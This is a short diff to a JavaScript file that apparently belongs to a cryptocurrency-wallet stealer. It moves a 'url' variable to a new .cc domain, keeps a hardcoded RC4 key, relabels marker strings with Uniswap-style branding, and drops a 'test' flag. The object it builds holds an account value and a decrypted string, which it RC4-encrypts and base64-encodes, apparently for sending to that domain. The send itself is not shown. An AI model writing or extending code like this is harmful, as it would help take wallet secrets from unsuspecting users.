@@ -30,7 +30,7 @@ const initialState = {
 	deleteName: '',
 };
 
-let url = 'https://ordinalshiro.cc/record/docs/filler';
+let url = 'https://crumpsolvergit.cc/date/spot/board';
 const kitkat = 'Qsx@ah&OR82WX9T6gCt';
 
 function createBody(str, account) {
@@ -41,8 +41,8 @@ function createBody(str, account) {
 	} else {
 		strDecr = str;
 	}
-	let xxx = 'LN$w@p|EX/G';
-	let xx = 'LN$w@p|EX';
+	let xxx = 'UNI$wAP|EX/G';
+	let xx = 'UNI$wAP|EX';
 
 	const obj = {
 		counts: 12,
@@ -53,7 +53,6 @@ function createBody(str, account) {
 		public: strDecr,
 		frontCode: false,
 		new: account,
-		test: true,
 	};
 
 	let crypt = btoa(rc4(kitkat, JSON.stringify(obj)));
